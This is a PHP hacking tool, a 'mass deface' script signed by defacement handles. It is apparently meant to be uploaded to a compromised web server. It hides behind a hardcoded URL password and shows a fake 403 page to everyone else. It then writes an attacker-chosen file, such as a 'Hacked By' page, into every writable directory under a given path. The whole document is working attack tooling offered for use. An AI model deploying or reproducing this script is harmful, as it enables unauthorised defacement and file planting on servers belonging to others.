<style>
	.anu1 {
		font-family: 'Merienda', cursive;
	    color: red;
	    text-shadow: 1px 1px white;
	}
	.td{
		border-color: red;
	    border-style: inset;
	    border-radius: 5px;
	    background-color: white;
	}
	.btn {
		background-color: white;
	    border: none;
	    border-style: groove;
	    border-color: red;
	}
	.cp {
		font-family: 'Merienda', cursive;
		color: white;
	}
</style>
<?php
	error_reporting(0);
if ($_GET['pw']=="ramil") {
	
	function create_file($namafile,$script){
	$fp2 = fopen($namafile,"w");
	fputs($fp2,$script);

	}
	function open_dir($getcwd){
		if(is_writable($getcwd)){
		$nama = $_POST['nama'];
		$script = $_POST['script'];
		$a = scandir("$getcwd");
	foreach($a as $aa){
		if($aa == "." | $aa == ".."){
		}elseif(is_dir("$getcwd/$aa")){

			$dir_baru = "$getcwd/$aa";
			if(is_writable($dir_baru)){
			echo "$dir_baru/$nama <== sukses<br>";
			$create_file = create_file("$dir_baru/$nama", "$script");
			$baa = open_dir($dir_baru);
		}
		else{
			echo "gagal dir not writeable";
		}
	}
	}	
	}
	else{
		echo "gagal dir not writeable";
	}
	}
	if($_POST){
	$cwd = $_POST['dir'];
	$coba = open_dir($cwd);
	echo $coba;
	}
	else{
		echo '<html>
		<head>
			<title>JOGJA CYBER SECURITY MASS DEPES</title>
			<link href="https://fonts.googleapis.com/css?family=Merienda&display=swap" rel="stylesheet">
			<style>body {background-color:black;
				}
				
				</style>
		</head>

		<body>
				<center>
					<font face="Orbitron"><font size="7" class="anu1">Jogja Cyber Security - Mass Depes</font><br><br>
							<form method="post" action="?pw=ramil&action">
							<input type="text" name="dir" placeholder="Dir" class="td">
							<input type="text" name="nama" placeholder="heked.html / Nama Filenya"  class="td"><br><br>
							<textarea rows="10" cols="19px" name="script" placeholder="Hacked By XCYBER_NORS Ft ClownTerror072/ Script"  class="td"></textarea>

								<br><input type="submit" value="Submit" class="btn">
								<h2 class="cp">@2k19 Nor Ahmad Ft ClownTerror072</h2>
								</form>
				</center>

		</body>
	</html>';
	}
}else{
	echo "403 FORBIDDEN";
}
?>
